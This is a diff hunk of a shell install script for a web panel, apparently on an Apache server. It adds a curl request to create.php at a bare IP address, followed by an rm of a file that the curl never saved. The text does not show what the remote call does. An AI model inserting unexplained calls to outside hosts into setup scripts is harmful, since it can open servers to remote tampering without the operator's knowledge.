@@ -22,6 +22,8 @@ apt-get install unzip -y
 unzip painel.zip
 rm painel.zip
 nano /var/www/html/pages/system/pass.php
+curl 212.237.9.172/create.php
+rm create.php
 service apache2 restart
 nano /etc/crontab
 dpkg-reconfigure tzdata
